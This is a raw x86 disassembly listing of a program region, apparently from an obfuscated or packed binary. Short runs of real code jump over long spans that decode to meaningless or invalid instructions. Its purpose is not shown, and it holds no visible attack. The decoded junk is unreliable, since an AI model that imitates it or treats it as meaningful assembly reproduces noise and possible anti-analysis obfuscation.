  4038c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038c5:	ret    0xd9e5
  4038c8:	mov    ah,0x92
  4038ca:	rcl    BYTE PTR [ecx+0x182d0c71],1
  4038d0:	shr    BYTE PTR [ecx],cl
  4038d2:	mov    dh,0x67
  4038d4:	shl    dh,0xee
  4038d7:	jno    0x4038bc
  4038d9:	pop    ebp
  4038da:	pusha  
  4038db:	cmp    eax,DWORD PTR [ebp+0x7bc17d8]
  4038e1:	icebp  
  4038e2:	call   0x5fdd3b52
  4038e7:	daa    
  4038e8:	loopne 0x4038ee
  4038ea:	ins    DWORD PTR es:[edi],dx
  4038eb:	pushf  
  4038ec:	xor    BYTE PTR [eax+0x7],bl
  4038ef:	or     ch,BYTE PTR [ebx-0x5f]
  4038f2:	lods   eax,DWORD PTR ds:[esi]
  4038f3:	inc    esi
  4038f4:	mov    ebx,0x89d0c52b
  4038f9:	cmp    BYTE PTR [esp+edi*8],dh
  4038fc:	loopne 0x403969
  4038fe:	ror    BYTE PTR [esi-0xd],1
  403901:	mov    edi,0x768e6e22
  403906:	pop    es
  403907:	xor    BYTE PTR [ebp+0x28b8f36d],0x15
  40390e:	cmp    dh,dl
  403910:	cs inc edx
  403912:	aam    0x96
  403914:	enter  0x91d8,0x72
  403918:	ret    0xce8
  40391b:	add    BYTE PTR [ebx-0x74a42d9f],cl
  403921:	and    dl,BYTE PTR [ebx-0x5635bb94]
  403927:	or     DWORD PTR [ecx-0x1a],ebp
  40392a:	mov    ch,0xa8
  40392c:	rcr    DWORD PTR [ebx+0x55],0xb4
  403930:	adc    cl,al
  403932:	jo     0x4038d3
  403934:	sub    al,0xf3
  403936:	ss je  0x403936
  403939:	pop    ebx
  40393a:	pusha  
  40393b:	loop   0x403922
  40393d:	inc    esi
  40393e:	or     eax,0x8bb8d1ea
  403943:	fldenv [esi-0x5fd523c5]
  403949:	pop    eax
  40394a:	mov    dl,0x63
  40394c:	inc    esp
  40394d:	dec    edi
  40394e:	gs pop ecx
  403950:	cwde   
  403951:	loopne 0x4039c6
  403953:	dec    ebx
  403954:	cmp    esp,ebp
  403956:	sbb    BYTE PTR [esi+0x30f80195],bh
  40395c:	loope  0x4039d3
  40395e:	ret    
  40395f:	push   ss
  403960:	cmp    eax,0x8a7e9818
  403965:	inc    edx
  403966:	xchg   ebx,eax
  403967:	in     al,0xaa
  403969:	test   BYTE PTR [ecx+0x52462d76],cl
  40396f:	push   ecx
  403970:	jmp    0x40396b
  403972:	inc    esi
  403973:	bound  edx,QWORD PTR [eax]
  403975:	aas    
  403976:	add    cl,dh
  403978:	sub    ebx,ecx
  40397a:	cmp    DWORD PTR ds:0x42f5fc,0x0
  403981:	jle    0x4039ab
  403987:	sbb    DWORD PTR ds:0x42f650,0x42f56c
  403991:	xor    ecx,edx
  403993:	jmp    0x4039ab
  403998:	push   0x1fc1
  40399d:	push   DWORD PTR [ebp-0x24]
  4039a0:	push   0x5d0f
  4039a5:	call   DWORD PTR ds:0x43880c
  4039ab:	add    DWORD PTR [eax],ebx
  4039ad:	jmp    0x403a85
  4039b2:	das    
  4039b3:	in     eax,dx
  4039b4:	sub    BYTE PTR [edx-0x3e],0x6f
  4039b8:	out    dx,eax
  4039b9:	in     eax,dx
  4039ba:	addr16 pop edx
  4039bc:	repnz pop edi
  4039be:	mov    ds:0xfee48d6f,al
  4039c3:	adc    al,BYTE PTR [eax]
  4039c5:	add    BYTE PTR [ebx+0x54000000],bh
  4039cb:	dec    edi
  4039cc:	jp     0x403a23
  4039ce:	cwde   
  4039cf:	(bad)
  4039d3:	jno    0x403a10
  4039d5:	dec    edx
  4039d6:	xor    DWORD PTR [ecx-0x7],0x7512aa83
  4039dd:	sub    eax,0x5916c7d5
  4039e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039e3:	pop    es
  4039e4:	loopne 0x403a1b
  4039e6:	mov    WORD PTR [edi-0x27ef00b],es
  4039ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039ed:	retf   0x735b
  4039f0:	add    BYTE PTR [edi-0x567040f5],cl
  4039f6:	cld    
  4039f7:	fidiv  WORD PTR ds:0xc230
  4039fc:	(bad)  
  4039fd:	or     DWORD PTR [ecx],eax
  4039ff:	pop    ebp
  403a00:	iret   
  403a01:	pop    edi
  403a02:	es sub eax,0x4f92c05a
  403a08:	jmp    0x4039a5
  403a0a:	push   es
  403a0b:	test   al,0x83
  403a0d:	xor    BYTE PTR [ebp+0xc8d0a3f],dl
  403a13:	and    BYTE PTR [ecx+0x593fb0c9],dl
  403a19:	adc    al,0x7d
  403a1b:	aaa    
  403a1c:	sub    edx,DWORD PTR [edi]
  403a1e:	push   ds
  403a1f:	leave  
  403a20:	cmp    BYTE PTR [ebx+eiz*1],bl
  403a23:	jmp    0xe7d7:0x89e93cc1
  403a2a:	cmp    eax,0xfbd8f75f
  403a2f:	sahf   
  403a30:	pop    edx
  403a31:	iret   
  403a32:	push   cs
  403a33:	clc    
  403a34:	sbb    dh,BYTE PTR [esi]
  403a36:	mov    al,ds:0xfe96335
  403a3b:	iret   
  403a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a3d:	mov    al,ds:0xb2bb07dd
  403a42:	scas   al,BYTE PTR es:[edi]
  403a43:	inc    ebp
  403a44:	mov    dh,0x3b
  403a46:	das    
  403a47:	ror    ebp,0xc3
  403a4a:	jb     0x403a14
  403a4c:	push   cs
  403a4d:	fwait
  403a4e:	mov    eax,ds:0x86599d55
  403a53:	pop    ebx
  403a54:	or     ch,BYTE PTR [ebx-0x31]
  403a57:	add    ebx,esi
  403a59:	shr    DWORD PTR [edx-0x12],cl
  403a5c:	xor    al,0xd3
  403a5e:	mov    bh,0x54
  403a60:	cmp    dh,BYTE PTR [ecx]
  403a62:	dec    esp
  403a63:	pop    eax
  403a64:	test   ecx,esi
  403a66:	cmp    bl,bh
  403a68:	scas   eax,DWORD PTR es:[edi]
  403a69:	aad    0x10
  403a6b:	pop    edi
  403a6c:	ins    BYTE PTR es:[edi],dx
  403a6d:	adc    DWORD PTR [edi],esp
  403a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a70:	inc    ecx
  403a71:	sub    eax,0x26c2bfc3
  403a76:	jl     0x403aa3
  403a78:	xchg   ecx,eax
  403a79:	hlt    
  403a7a:	xor    al,bl
  403a7c:	sub    DWORD PTR [eax],0xb04d6ba4
  403a82:	jmp    0x7cbbaa2
  403a87:	mov    ecx,DWORD PTR [edi+0x4]
  403a8a:	jmp    0x403b62
  403a8f:	f2xm1  
  403a91:	out    0x87,eax
  403a93:	out    dx,eax
  403a94:	xchg   edi,eax
  403a95:	stc    
  403a96:	inc    BYTE PTR [esi]
  403a98:	xchg   esi,eax
  403a99:	push   ebp
  403a9a:	adc    DWORD PTR [bx],ebp
  403a9d:	sub    bl,dh
  403a9f:	mov    ecx,0xbb000013
  403aa4:	add    BYTE PTR [eax],al
  403aa6:	add    BYTE PTR [ebx],cl
  403aa8:	sub    al,0x45
  403aaa:	ins    BYTE PTR es:[edi],dx
  403aab:	adc    ch,BYTE PTR [edx]
  403aad:	loop   0x403b22
  403aaf:	mov    dh,0x55
  403ab1:	jg     0x403b32
  403ab3:	dec    esi
  403ab4:	xchg   ebx,eax
  403ab5:	cwde   
  403ab6:	sub    eax,0x780de956
  403abb:	int    0xfa
  403abd:	shufps xmm1,XMMWORD PTR [edx+0x77db6b9d],0x1f
  403ac5:	and    eax,0x16589692
  403aca:	aad    0xd2
  403acc:	in     al,0xa7
  403ace:	sub    DWORD PTR [edx],esp
  403ad0:	into   
  403ad1:	mov    dh,0x12
  403ad3:	mov    dl,0x8
  403ad5:	xor    bl,BYTE PTR [esp+esi*2+0x5132c4e1]
  403adc:	xchg   esp,eax
  403add:	pop    esp
  403ade:	inc    ebx
  403adf:	pop    ebp
  403ae0:	nop
  403ae1:	sbb    dh,BYTE PTR [ecx+0x1e906409]
  403ae7:	mov    dh,0x18
  403ae9:	stc    
  403aea:	pop    es
  403aeb:	jmp    0xddea26b2
  403af0:	addr16 sbb eax,0x3022ea91
  403af6:	mov    al,0x47
  403af8:	and    cl,0x25
  403afb:	mov    esi,DWORD PTR [ebp*4-0x245aadd1]
  403b02:	xor    dh,BYTE PTR [edx-0x5d]
  403b05:	dec    esp
  403b06:	mov    ch,0xb6
  403b08:	sahf   
  403b09:	xchg   edx,eax
  403b0a:	xor    ch,0x52
  403b0d:	jecxz  0x403adf
  403b0f:	mov    edx,0x20e70319
  403b14:	(bad)  
  403b16:	sar    BYTE PTR [esi-0x4d],0xf4
  403b1a:	movlps QWORD PTR [ebp+ebp*1-0x67],xmm4
  403b1f:	xchg   BYTE PTR [edx],ah
  403b21:	xchg   BYTE PTR [eax+0x5de7e268],bl
  403b27:	rol    DWORD PTR [edx],cl
  403b29:	sbb    bl,BYTE PTR [edx-0x1f]
  403b2c:	mov    cl,0xb0
  403b2e:	jmp    0x17a641d6
  403b33:	sub    al,0xe0
  403b35:	aas    
  403b36:	fucomp st(0)
  403b38:	cmc    
  403b39:	mov    cs,WORD PTR [ebp+0x3c424168]
  403b3f:	rol    DWORD PTR [ebx-0x6a],0x75
  403b43:	mov    ds:0xa0e8b0d2,al
  403b48:	pushf  
  403b49:	aam    0x6c
  403b4b:	add    bh,cl
  403b4d:	xchg   edi,eax
  403b4e:	push   edi
  403b4f:	es ds push esi
  403b52:	sbb    DWORD PTR [eax-0x18ad675f],ebx
  403b58:	hlt    
  403b59:	jo     0x403b7a
  403b5b:	adc    BYTE PTR [ebx],0x64
  403b5e:	dec    edi
  403b5f:	push   eax
  403b60:	fistp  WORD PTR [ebp-0x4439cd]
  403b66:	lods   al,BYTE PTR ds:[esi]
  403b67:	add    BYTE PTR [eax],al
  403b69:	movzx  edx,BYTE PTR ds:0x42f558
  403b70:	sbb    DWORD PTR ds:0x42f644,edx
  403b76:	xor    ecx,ebx
  403b78:	cmp    DWORD PTR ds:0x42f5c4,0x0
  403b7f:	jbe    0x403bb8
  403b85:	and    edx,0x1359
  403b8b:	jmp    0x403bb8
  403b90:	push   0x1616
  403b95:	push   0x42f5a4
  403b9a:	push   DWORD PTR [ebp-0x14]
  403b9d:	push   0x42f544
  403ba2:	push   0x5942
  403ba7:	push   DWORD PTR [ebp-0x14]
  403baa:	push   DWORD PTR [ebp-0x10]
  403bad:	push   0x58d1
  403bb2:	call   DWORD PTR ds:0x4387ec
  403bb8:	add    eax,0x99b8624d
  403bbd:	adc    ecx,0x8ddc
  403bc3:	mov    DWORD PTR [ebp-0x60],eax
  403bc6:	jmp    0x403c9e
  403bcb:	mov    al,ds:0xf4cfe414
  403bd0:	jmp    FWORD PTR [ebx+0x680b447f]
  403bd6:	lahf   
  403bd7:	fiadd  WORD PTR [ecx+0x4]
  403bda:	cmp    DWORD PTR [esp+edx*1+0x0],esi
  403bde:	add    BYTE PTR [ebx+0x15000000],bh
  403be4:	push   ecx
  403be5:	and    BYTE PTR [edi+eiz*1],ch
  403be8:	jg     0x403c61
  403bea:	and    BYTE PTR [ebp-0x770b9c2f],ah
  403bf0:	lahf   
  403bf1:	ins    DWORD PTR es:[edi],dx
  403bf2:	fisub  DWORD PTR [eax+0x64e176ec]
  403bf8:	dec    ecx
  403bf9:	(bad)
  403bfd:	cmp    ch,cl
  403bff:	jmp    0x48a1d4d3
  403c04:	ret    0xd9b
  403c07:	pop    ebp
  403c08:	jl     0x403c24
  403c0a:	mov    bh,0x3f
  403c0c:	test   eax,0x3a6c788d
  403c11:	inc    esi
  403c12:	mov    DWORD PTR [edi+0x5c],ebx
  403c15:	(bad)  
  403c16:	cwde   
  403c17:	xchg   esi,eax
  403c18:	ficom  DWORD PTR [eax+0x61bb435c]
  403c1e:	int3   
  403c1f:	dec    esp
  403c20:	or     BYTE PTR [ebp-0x51],dl
  403c23:	mov    es,WORD PTR [ebp+ebp*8+0x3015770f]
  403c2a:	inc    eax
  403c2b:	nop
  403c2c:	jge    0x403bf5
  403c2e:	int    0x7b
  403c30:	add    al,0xde
  403c32:	fisubr DWORD PTR [esi+0x36b7225b]
  403c38:	add    al,0xfa
  403c3a:	mov    esp,0x993d1119
  403c3f:	sbb    DWORD PTR [edi-0x3e2a3d5f],eax
  403c45:	pop    ss
  403c46:	jae    0x403ca8
  403c48:	xchg   edi,eax
  403c49:	inc    ebx
  403c4a:	les    edi,FWORD PTR [ebx-0x47124c29]
  403c50:	and    DWORD PTR [edi-0x56],ecx
  403c53:	or     ebx,DWORD PTR ds:0x40570b6e
  403c59:	out    dx,al
  403c5a:	icebp  
  403c5b:	scas   eax,DWORD PTR es:[edi]
  403c5c:	loope  0x403c47
  403c5e:	ds add esi,edi
  403c61:	cmp    eax,0xf8bea946
  403c66:	pop    ebp
  403c67:	jecxz  0x403c00
  403c69:	int3   
  403c6a:	(bad)  
  403c6b:	pop    esi
  403c6c:	pop    ecx
  403c6d:	fldz   
  403c6f:	out    dx,eax
  403c70:	div    eax
  403c72:	mov    ss,WORD PTR [esi]
  403c74:	dec    eax
  403c75:	or     dh,BYTE PTR [ecx-0x73436bf1]
  403c7b:	scas   eax,DWORD PTR es:[edi]
  403c7c:	sar    DWORD PTR [ebp-0x2ec87ee7],1
  403c82:	inc    esi
  403c83:	xlat   BYTE PTR ds:[ebx]
  403c84:	push   edx
  403c85:	pop    ds
  403c86:	or     al,0x27
  403c88:	pop    eax
  403c89:	xchg   edx,eax
  403c8a:	addr16 adc eax,0xc5eeb6ec
  403c90:	xor    eax,0x89070ee3
  403c95:	cdq    
  403c96:	test   BYTE PTR [ebx-0x11],al
  403c99:	fs push 0x64
  403c9c:	mov    ds:0xa44d89bd,al
  403ca1:	jmp    0x403d79
  403ca6:	or     esi,DWORD PTR [ecx]
  403ca8:	popa   
  403ca9:	fdivr  QWORD PTR [ebx-0x24]
  403cac:	mov    edi,0xb5a4aef7
  403cb1:	ret    
  403cb2:	shl    DWORD PTR [ebp+0x152f5f03],cl
  403cb8:	add    BYTE PTR [eax],al
  403cba:	mov    ebx,0x9c000000
  403cbf:	push   ss
  403cc0:	jle    0x403cdd
  403cc2:	push   eax
  403cc3:	icebp  
  403cc4:	loopne 0x403cdd
  403cc6:	in     al,dx
  403cc7:	add    al,0x37
  403cc9:	and    ebx,esi
  403ccb:	in     al,dx
  403ccc:	mov    ds:0x38eb8e36,eax
  403cd1:	adc    DWORD PTR [eax-0x14fbd48c],ecx
  403cd7:	loopne 0x403ca0
  403cd9:	jl     0x403d2c
  403cdb:	dec    eax
  403cdc:	cwde   
  403cdd:	sub    al,0xe
  403cdf:	sbb    bh,BYTE PTR [ecx+0x3482cad2]
  403ce5:	out    dx,al
  403ce6:	jb     0x403cb0
  403ce8:	stos   DWORD PTR es:[edi],eax
  403ce9:	arpl   WORD PTR [ebp-0x75],si
  403cec:	aas    
  403ced:	call   0x75d2:0x47641e76
  403cf4:	adc    BYTE PTR [esi+0x3d],al
  403cf7:	xchg   ebp,eax
  403cf8:	push   edi
  403cf9:	push   eax
  403cfa:	nop
  403cfb:	mov    edx,0x65a3e56a
  403d00:	mov    ebp,0x2128017f
  403d05:	mov    ebx,0xc94a0d2b
  403d0a:	push   ss
  403d0b:	gs js  0x403d87
  403d0e:	dec    eax
  403d0f:	sbb    al,0x46
  403d11:	xor    DWORD PTR [eax-0x27923401],0x46d6c6d2
  403d1b:	sub    eax,0x1c9e10da
  403d20:	dec    edi
  403d21:	(bad)  
  403d22:	mov    bh,0x3c
  403d24:	imul   edx,DWORD PTR [eax-0x5fa5baf4],0x52d0e452
  403d2e:	xor    al,0xe7
  403d30:	pop    ecx
  403d31:	mov    ah,0x7d
  403d33:	(bad)  
  403d34:	sub    ecx,DWORD PTR [eax-0x6603d5f0]
  403d3a:	aaa    
  403d3b:	xor    BYTE PTR [edx+0x60],dh
  403d3e:	sub    al,dl
  403d40:	push   esp
  403d41:	cmp    ch,BYTE PTR [edi+0x27]
  403d44:	fstp   DWORD PTR [ebx-0x5c]
  403d47:	push   0xffffffa8
  403d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d4a:	sub    BYTE PTR [eax],dh
  403d4c:	shr    DWORD PTR [ebp+0x3c6e26fd],1
  403d52:	in     eax,dx
  403d53:	adc    edi,esi
  403d55:	std    
  403d56:	xor    DWORD PTR [ebp+0x2cc747fb],ebp
  403d5c:	jno    0x403cfb
  403d5e:	xchg   ecx,eax
  403d5f:	mov    bl,0xf7
  403d61:	add    edi,DWORD PTR cs:[edi]
  403d64:	mov    al,0x85
  403d66:	push   edx
  403d67:	pop    edx
  403d68:	aam    0x82
  403d6a:	jae    0x403ddd
  403d6c:	in     al,0x60
  403d6e:	ficomp WORD PTR [esi+0x16]
  403d71:	pusha  
  403d72:	sub    al,0x91
  403d74:	fstp   TBYTE PTR [ecx-0x740e6dee]
  403d7a:	dec    ebp
  403d7b:	adc    al,0x8b
  403d7d:	add    edi,esi
  403d7f:	shr    cl,cl
  403d81:	rol    DWORD PTR [eax],cl
  403d83:	add    BYTE PTR [eax],al
  403d85:	and    ch,al
  403d87:	and    DWORD PTR [edi-0x15],esp
  403d8a:	out    dx,eax
  403d8b:	in     ax,dx
  403d8d:	aam    0x49
  403d8f:	push   es
  403d90:	or     eax,0x7a68058d
  403d95:	jmp    0x0:0xbb000015
  403d9c:	add    BYTE PTR [edi-0x54],al
  403d9f:	lds    ecx,FWORD PTR [ebp+0x62]
  403da2:	mov    al,ds:0x96e067c6
  403da7:	xchg   ebx,eax
  403da8:	jo     0x403d30
  403daa:	jnp    0x403d9a
  403dac:	adc    eax,0x8a94907f
  403db1:	inc    esi
  403db2:	in     al,0xf2
  403db4:	enter  0x6d76,0xdd
  403db8:	add    al,BYTE PTR [ebx+0x34]
  403dbb:	sbb    al,0x70
  403dbd:	(bad)  
  403dbe:	cmp    bl,BYTE PTR [eax+0x22635f2d]
  403dc4:	popa   
  403dc5:	mov    WORD PTR [edi+edx*2],ds
  403dc8:	inc    edi
  403dc9:	ret    
  403dca:	es sbb ebp,eax
  403dcd:	pop    edx
  403dce:	add    BYTE PTR ds:0x1f4f3f5d,al
  403dd4:	and    bh,BYTE PTR [ebx-0x1]
  403dd7:	outs   dx,BYTE PTR ds:[esi]
  403dd8:	push   0x2fa73d66
  403ddd:	shl    al,cl
  403ddf:	mov    ds:0x409e31f3,al
  403de4:	enter  0xcb9e,0x41
  403de8:	cmp    al,0x1d
  403dea:	pop    eax
  403deb:	xchg   ecx,eax
  403dec:	and    cl,BYTE PTR [eax+0x34]
  403def:	push   0xffffff91
  403df1:	jge    0x403dde
  403df3:	mov    cs,ebx
  403df5:	xchg   esi,eax
  403df6:	arpl   ax,sp
  403df8:	ret    
  403df9:	vhsubps xmm3,xmm4,XMMWORD PTR [ebx]
  403dfd:	xor    esi,ebx
  403dff:	pushf  
  403e00:	sar    DWORD PTR [eax-0x38fb0c0d],cl
  403e06:	js     0x403e07
  403e08:	mov    ch,BYTE PTR [esi]
  403e0a:	pop    eax
  403e0b:	gs mov edx,0x27362c2a
  403e11:	pop    esi
  403e12:	mov    ds:0x8934bb0c,al
  403e17:	ins    BYTE PTR es:[edi],dx
  403e18:	arpl   WORD PTR ds:0xd5bc2c92,si
  403e1e:	adc    ebp,DWORD PTR [edx-0x6070e4be]
  403e24:	test   al,0xc2
  403e26:	aaa    
  403e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e28:	jmp    0x403dad
  403e2a:	push   edx
  403e2b:	mov    edx,0x161fd89e
  403e30:	jne    0x403dda
  403e32:	xchg   ebp,eax
  403e33:	mov    eax,ds:0xce547e0f
  403e38:	dec    ecx
  403e39:	pop    esi
  403e3a:	xor    ebx,esp
  403e3c:	jo     0x403e9c
  403e3e:	mov    ecx,0x5d277060
  403e43:	frstor ds:0x25889dfd
  403e49:	aad    0x24
  403e4b:	jbe    0x403dd9
  403e4d:	inc    ebp
  403e4e:	sub    BYTE PTR [esp+ebx*4+0x3a],bh
  403e52:	(bad)  
  403e53:	stc    
  403e54:	mov    gs,ecx
  403e56:	xor    eax,0x4518b84
  403e5b:	xor    eax,esi
  403e5d:	add    DWORD PTR ds:0x42f534,0x9bd
  403e67:	xor    edx,ebx
  403e69:	add    eax,0x99b8624d
  403e6e:	jmp    0x403f46
  403e73:	xor    al,0xfb
  403e75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e76:	aaa    
  403e77:	out    dx,eax
  403e78:	jg     0x403e2e
  403e7a:	sti    
  403e7b:	mov    ch,0x9d
  403e7d:	or     esi,DWORD PTR [eax-0x6f]
  403e80:	mov    ah,0xa0
  403e82:	in     al,0xa5
  403e84:	push   ss
  403e85:	add    BYTE PTR [eax],al
  403e87:	mov    ebx,0x6b000000
  403e8c:	mov    bh,0xca
  403e8e:	(bad)  
  403e8f:	mov    ebx,ecx
  403e91:	cdq    
  403e92:	pmulhw mm6,QWORD PTR [esi]
  403e95:	fwait
  403e96:	clc    
  403e97:	cli    
  403e98:	sbb    esp,DWORD PTR [ebx]
  403e9a:	push   ebp
  403e9b:	cwde   
  403e9c:	sahf   
  403e9d:	xor    DWORD PTR [ebx+0x240b5514],esp
  403ea3:	fs sub al,0x50
  403ea6:	mov    BYTE PTR [esp+eiz*8+0x942db],dh
  403ead:	dec    DWORD PTR [esp+edx*4-0x4d]
  403eb1:	push   ecx
  403eb2:	popa   
  403eb3:	xor    eax,0x832bbb32
  403eb8:	or     BYTE PTR [edi-0x7af427d5],0x45
  403ebf:	inc    eax
  403ec0:	loopne 0x403eca
  403ec2:	stos   DWORD PTR es:[edi],eax
  403ec3:	lods   eax,DWORD PTR ds:[esi]
  403ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ec5:	(bad)  
  403ec6:	fwait
  403ec7:	mov    WORD PTR [ebp-0x24],fs
  403eca:	jo     0x403e78
  403ecc:	xchg   esp,eax
  403ecd:	cdq    
  403ece:	adc    edx,DWORD PTR ss:[eax]
  403ed1:	dec    ebp
  403ed2:	out    0x26,eax
  403ed4:	adc    BYTE PTR [eax-0x31069500],dh
  403eda:	addr16 cdq 
  403edc:	fsub   st,st(6)
  403ede:	mov    dh,0x44
  403ee0:	int    0x3f
  403ee2:	js     0x403e82
  403ee4:	pop    ecx
  403ee5:	scas   eax,DWORD PTR es:[edi]
  403ee6:	jne    0x403e93
  403ee8:	push   ds
  403ee9:	pop    ebx
  403eea:	int3   
  403eeb:	lods   al,BYTE PTR ds:[esi]
  403eec:	mov    eax,ds:0xb12daaad
  403ef1:	ret    0xd441
  403ef4:	push   0xfffffff0
  403ef6:	push   es
  403ef7:	sbb    esi,DWORD PTR [edi-0x6f]
  403efa:	ficomp WORD PTR [edx]
  403efc:	lock fpatan 
  403eff:	mov    bl,dl
  403f01:	lods   eax,DWORD PTR ds:[esi]
  403f02:	cli    
  403f03:	inc    edx
  403f04:	jle    0x403f54
  403f06:	pop    edx
  403f07:	outs   dx,BYTE PTR ds:[esi]
  403f08:	int    0x8c
  403f0a:	enter  0xe8ff,0x5
  403f0e:	(bad)  
  403f0f:	add    eax,0xf2170158
  403f14:	cdq    
  403f15:	jns    0x403f37
  403f17:	jbe    0x403f6d
  403f19:	daa    
  403f1a:	pop    esp
  403f1b:	int    0xc3
  403f1d:	pusha  
  403f1e:	mov    edx,0x14fd49fb
  403f23:	adc    ebx,DWORD PTR [ebx]
  403f25:	jnp    0x403fa2
  403f27:	iret   
  403f28:	add    ah,BYTE PTR [esi-0x3bf92e4]
  403f2e:	out    dx,al
  403f2f:	dec    ecx
  403f30:	add    al,0x57
  403f32:	neg    BYTE PTR [eax-0x4c]
  403f35:	popa   
  403f36:	out    dx,eax
  403f37:	mov    ah,0xf8
  403f39:	call   FWORD PTR [edx-0x71]
  403f3c:	pop    esp
  403f3d:	dec    eax
  403f3e:	in     al,0xb5
  403f40:	pop    es
  403f41:	ror    DWORD PTR [edx],1
  403f43:	cmc    
  403f44:	xor    bl,BYTE PTR [ecx]
  403f46:	adc    edx,0x8ddc
  403f4c:	mov    DWORD PTR ds:0x42f588,0x13ad
  403f56:	mov    DWORD PTR [ebp-0x54],edx
  403f59:	mov    DWORD PTR ds:0x42f5a0,0x5b9f
  403f63:	cmp    DWORD PTR [ebp-0x60],eax
  403f66:	mov    DWORD PTR ds:0x42f538,0x30b1
  403f70:	jne    0x404065
  403f76:	not    eax
  403f78:	mov    eax,edx
  403f7a:	mov    DWORD PTR ds:0x42f55c,0x4c11
  403f84:	cmp    DWORD PTR [ebp-0x5c],eax
  403f87:	je     0x4046df
  403f8d:	jmp    0x404065
  403f92:	repz inc esi
  403f94:	pop    ecx
  403f95:	mov    ch,0xfd
  403f97:	mov    edi,0x740b46ff
  403f9c:	xor    eax,0x678ad9e4
  403fa1:	sbb    al,0x60
  403fa3:	pop    ss
  403fa4:	add    BYTE PTR [eax],al
  403fa6:	mov    ebx,0xf3000000
  403fab:	cmp    DWORD PTR [eax+0x5f9a29b9],edi
  403fb1:	test   DWORD PTR [ebp+edi*4-0x1652adec],edx
  403fb8:	enter  0xa0fb,0xa3
  403fbc:	sub    DWORD PTR [eax-0x4cfea64e],esp
  403fc2:	cli    
  403fc3:	xor    ah,dh
  403fc5:	xchg   DWORD PTR [esi],esi
  403fc7:	idiv   DWORD PTR [ecx-0x4]
  403fca:	fisubr WORD PTR [ebx]
  403fcc:	out    0x2f,al
  403fce:	push   es
  403fcf:	sbb    dl,bh
  403fd1:	retf   
  403fd2:	out    dx,al
  403fd3:	mov    ch,0xeb
  403fd5:	mov    bl,0xeb
  403fd7:	(bad)  
  403fd8:	(bad)  
  403fda:	(bad)  
  403fdb:	jno    0x404006
  403fdd:	push   esi
  403fde:	mov    eax,ds:0x1f606b7
  403fe3:	mov    WORD PTR [ecx],gs
  403fe5:	jb     0x404034
  403fe7:	inc    esp
  403fe8:	inc    esp
  403fe9:	leave  
  403fea:	and    esi,DWORD PTR [esi-0x5a]
  403fed:	sub    bh,BYTE PTR [edi+0xb782a17]
  403ff3:	call   0x6d9c:0x6cfd3e7b
  403ffa:	mov    dl,0xbb
  403ffc:	mov    ebp,0x47b097dd
  404001:	pop    edi
  404002:	ret    0x18b0
  404005:	icebp  
  404006:	loopne 0x40406e
  404008:	pop    ecx
  404009:	es xchg ecx,eax
  40400b:	gs and al,0xa0
  40400e:	xor    bl,BYTE PTR [esi+0x53]
  404011:	scas   al,BYTE PTR es:[edi]
  404012:	cmp    bh,al
  404014:	or     dl,bl
  404016:	push   edx
  404017:	dec    esi
  404018:	pop    ds
  404019:	mov    WORD PTR [ecx-0x65],ss
  40401c:	push   ecx
  40401d:	or     BYTE PTR [ecx+edi*8-0xe],dh
  404021:	push   edi
  404022:	repnz lods al,BYTE PTR ds:[esi]
  404024:	xchg   edi,eax
  404025:	dec    esp
  404026:	pop    edi
  404027:	mov    ds:0x518729e4,eax
  40402c:	add    BYTE PTR [esi+0x350beff1],0x40
  404033:	or     BYTE PTR [ebp+0x71],dl
  404036:	sbb    cl,0x31
  404039:	ins    DWORD PTR es:[edi],dx
  40403a:	jl     0x403fe7
  40403c:	sbb    ebx,DWORD PTR [edx-0x6b]
  40403f:	mov    edx,0xfef3e9e0
  404044:	test   BYTE PTR [esi+ecx*4],cl
  404047:	xor    BYTE PTR [eax+0x41a76e94],bh
  40404d:	jmp    0xe136554f
  404052:	jg     0x403fd7
  404054:	or     BYTE PTR [eax+0x62fb0123],ah
  40405a:	cmp    BYTE PTR [esi-0x28],bl
  40405d:	mov    al,0x86
  40405f:	aad    0x35
  404061:	mov    edi,esi
  404063:	enter  0xc758,0x45
  404067:	mov    al,0xa9
  404069:	sbb    al,0xfe
  40406b:	adc    BYTE PTR [ebx+0x42f5d43d],al
  404071:	add    BYTE PTR [eax],al
  404073:	jl     0x404184
  404079:	mov    edx,DWORD PTR ds:0x42f6a0
  40407f:	mov    eax,ds:0x42b034
  404084:	sub    eax,edx
  404086:	add    edx,DWORD PTR [edx+eax*1]
  404089:	jmp    0x404184
  40408e:	push   DWORD PTR [ebp-0x20]
  404091:	push   0x42f624
  404096:	push   0x42a64b
  40409b:	push   DWORD PTR [ebp-0x1c]
  40409e:	push   DWORD PTR [ebp-0x20]
  4040a1:	push   0x67e9
  4040a6:	call   DWORD PTR ds:0x4387f0
  4040ac:	jmp    0x404184
  4040b1:	xchg   ebx,eax
  4040b2:	pop    eax
  4040b3:	sbb    BYTE PTR [ebx],bl
  4040b5:	fistp  DWORD PTR [ebx-0x6d]
  4040b8:	fdiv   st,st(1)
  4040ba:	push   0x3eaba456
  4040bf:	sub    eax,0x181bbb
  4040c4:	add    BYTE PTR [ebx+0x16000000],bh
  4040ca:	xchg   esi,eax
  4040cb:	cmp    BYTE PTR [eax],dl
  4040cd:	mov    BYTE PTR [eax],cl
  4040cf:	push   ss
  4040d0:	aaa    
  4040d1:	outs   dx,DWORD PTR ds:[esi]
  4040d2:	imul   edx,DWORD PTR [ebx+0x34],0x6e
  4040d6:	ret    0x2ac7
  4040d9:	fidivr WORD PTR [eax]
  4040db:	sahf   
  4040dc:	adc    al,0x11
  4040de:	mov    ebx,0xd299cbf1
  4040e3:	inc    esp
  4040e4:	sbb    eax,0xf2312925
  4040e9:	test   al,0x67
  4040eb:	mov    ebp,0xb1ed27e7
  4040f0:	stc    
  4040f1:	xchg   BYTE PTR [ecx+0x6f],al
  4040f4:	ja     0x4040e9
  4040f6:	or     bh,BYTE PTR [ebx]
  4040f8:	jns    0x4040d7
  4040fa:	pusha  
  4040fb:	test   al,0x8e
  4040fd:	stos   DWORD PTR es:[edi],eax
  4040fe:	test   DWORD PTR [edx-0x40],0xafd0773f
